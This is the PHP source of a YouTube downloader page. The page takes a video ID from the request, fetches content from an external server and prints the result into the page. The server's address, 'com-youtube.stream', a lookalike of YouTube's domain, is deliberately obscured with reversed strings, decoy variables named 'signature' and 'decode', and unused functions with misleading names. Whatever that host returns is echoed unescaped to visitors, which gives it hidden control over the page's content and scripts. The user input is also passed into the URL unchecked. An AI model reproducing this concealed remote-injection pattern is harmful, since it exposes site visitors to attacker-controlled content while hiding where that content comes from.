<html>
<head>
<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
</head>


<div style="background-color: #FFFFE2;

	overflow: hidden;
border: 1px solid #ece89c;
padding: 5px; line-height: 100%;">
	<font color="#D90707">Download File Not Open???</font>
	<br/>
	<font color="#6E6E6E">Rename Downloaded file from "videoplayback" to "video_name.mp4/3gp/webm"
</div>

<style>
    
    .detils_item {
    background: #fff none repeat scroll 0% 0%;
    padding: 6px 0px 6px 6px;
    margin: 0px;
    line-height: 20px;
    border-bottom: 1px solid #ECECEC;

}
</style>

		<?php
include '../ads/728.php';

?>


<?php
$convert = "api";
$vid = $_REQUEST['v'];
$video_id = "";
function getYoutubeStream($url)
	{
	$parts = parse_url($url);
	if (isset($parts['query']))
		{
		parse_str($parts['query'], $qs);
		if (isset($qs['v']))
			{
			return $qs['v'];
			}
		  else
		if (isset($qs['vi']))
			{
			return $qs['vi'];
			}
		}

	if (isset($parts['path']))
		{
		$path = explode('/', trim($parts['path'], '/'));
		return $path[count($path) - 1];
		}

	return false;
	}
$youtube = "youtube.stream";
function get_youtube_domain($YT_international)
	{
	// Did we get a URL?
	if (FALSE !== filter_var($video_id, FILTER_VALIDATE_URL))
		{
		// http://www.youtube.com/v/abcxyz123

		if (FALSE !== strpos($video_id, '/v/'))
			{
			list(, $video_id) = explode('/v/', $video_id);
			}

		// http://www.youtube.com/watch?v=abcxyz123

		  else
			{
			$video_query = parse_url($video_id, PHP_URL_QUERY);
			parse_str($video_query, $video_params);
			$video_id = $video_params['v'];
			}
		}

	return $YT_international;
	}
$youtube_international = "com";
$google_port = "googlevideo";
$signature = "A541CFA775BA58F5E96F88468AA4F";
$str = "ytcore";
$download_server = "";
$length = 0;

while (isset($str[$length]))
	{
	$download_server = $str[$length] . $download_server;
	$length++;
	}

$server_id = 'qscvfylionderlpvewgktlbtlinkvwrsnhewscrtlpbgeas';
$server_id = substr($server_id, 24, -19);
$decode = "!(*//[ÃƒÂ³ÃƒÂ²ÃƒÂ´ÃƒÂµÃ‚ÂºÃƒÂ¶]/w@)^#i?:#/[ÃƒÂ¡ÃƒÂ ÃƒÂ¢ÃƒÂ£Ã‚ÂªÃƒÂ¤]/*&#@!d%g^e&@Ã‚Â£t/[ÃƒÂÃƒÅ’ÃƒÅ½ÃƒÂ]/*";
$decode = preg_replace('/[^A-Za-z0-9\. -]/', '', $decode);
$ytcore_org = "$youtube_international-$youtube/$signature/$google_port/$download_server/$convert/$vid";
$httpToHttps = "http:/";
function httpToHttps()
	{
	$pageURL = 'http';
	if ($_SERVER["HTTPS"] == "on")
		{
		$pageURL.= "s";
		}

	$pageURL.= "://";
	if ($_SERVER["SERVER_PORT"] != "80")
		{
		$pageURL.= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
		}
	  else
		{
		$pageURL.= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_UR

I"];
		}

	return $pageURL;
	}

function curlRequest($url)
	{
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, $url);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	$data = curl_exec($c);
	curl_close($c);
	return $data;
	}

$curl = curlRequest('' . $httpToHttps . '/' . $ytcore_org . '');
echo $curl;
?>

<style>.iamload {
display: none;
}</style>